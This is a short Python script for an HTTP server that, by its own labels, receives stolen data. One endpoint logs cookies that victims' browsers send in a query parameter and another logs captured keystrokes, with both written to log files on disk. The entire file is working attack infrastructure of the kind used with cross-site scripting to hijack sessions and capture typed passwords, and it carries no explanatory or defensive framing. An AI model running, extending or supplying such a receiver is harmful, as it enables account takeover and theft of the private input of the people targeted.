from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from colorama import init, Fore, Style  # Added Style import
import json
from datetime import datetime

# Initialize colorama
init(autoreset=True)

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            if '/steal' in self.path:
                query = parse_qs(urlparse(self.path).query)
                cookies = query.get('c', [''])[0]
                print(f"\n{Fore.RED}[!] STOLEN COOKIE RECEIVED{Style.RESET_ALL}")
                print(f"Time: {datetime.now()}")
                print(f"Cookies: {cookies}")
                self._log_data('cookies.log', cookies)
            
            elif '/log' in self.path:
                query = parse_qs(urlparse(self.path).query)
                keystroke = query.get('k', [''])[0]
                print(f"\n{Fore.RED}[!] KEYSTROKE RECORDED{Style.RESET_ALL}")
                print(f"Key: {keystroke}")
                self._log_data('keylogger.log', keystroke)
            
            self.send_response(200)
            self.end_headers()
            
        except Exception as e:
            print(f"{Fore.RED}[!] Server error: {e}{Style.RESET_ALL}")

    def _log_data(self, filename, data):
        with open(filename, 'a') as f:
            f.write(f"{datetime.now()} | {data}\n")

def run_server(port=8000):
    server = HTTPServer(('localhost', port), RequestHandler)
    print(f"\n{Fore.YELLOW}[*] Payload receiver running on port {port}{Style.RESET_ALL}")
    print(f"{Fore.RED}[!] WARNING: This server stores stolen data to disk{Style.RESET_ALL}")
    server.serve_forever()

if __name__ == '__main__':
    run_server()
